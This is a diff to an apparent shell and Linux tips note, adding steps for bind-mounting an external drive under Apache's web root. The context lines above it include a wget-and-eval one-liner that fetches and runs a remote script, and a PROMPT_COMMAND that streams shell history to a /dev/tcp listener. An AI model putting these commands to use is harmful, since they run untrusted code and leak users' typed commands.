@@ -38,3 +38,35 @@ bash -c CMD="`wget -qO- http://<ip>/script.sh`" && eval "$CMD"
 ```
 PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
 ```
+
+### Apache map external drive to webroot
+
+* Create a directory on the external HDD, assuming it is mounted under the `/media` directory, like so:
+
+```
+sudo mkdir /media/web_files
+```
+
+* Change the ownership of this directory and all the files under it to be owned by the Apache user `www-data` like so:
+
+```
+sudo chown -R www-data:www-data /media/web_files/
+```
+
+* Create a directory under the web root directory ie `/var/www/html/` like so:
+
+```
+sudo mkdir /var/www/html/external_files
+```
+
+* Bind the `/media/web_files/` directory to the `/var/www/html/external_files/` directory like so:
+
+```
+sudo mount --bind /media/web_files/ /var/www/html/external_files/
+```
+
+* All files on the external HDD under the `/media/web_files/` directory will be available for Apache under the `/var/www/html/external_files/` directory and you can link to them in your web page that resides in `/var/www/html/` like so:
+
+```
+<a href="external_files/file1.mp4">file1</a>
+```
